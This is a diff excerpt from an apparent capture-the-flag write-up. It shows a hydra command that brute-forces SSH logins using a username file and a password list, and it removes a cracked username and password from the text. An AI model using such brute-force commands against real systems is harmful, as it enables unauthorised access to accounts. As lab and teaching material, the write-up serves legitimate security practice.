@@ -68,8 +68,7 @@ To do this attack we must make a file containing the usernames, which for conven
 `hydra -l users.txt -P locks.txt ssh://<machine_ip -V>`
 
 SUCCESS!!! 
-Username: Lin
-Password: RedDr4gonSynd1cat3
+We now have a username and password
 
 ### Privelege Escalation
 
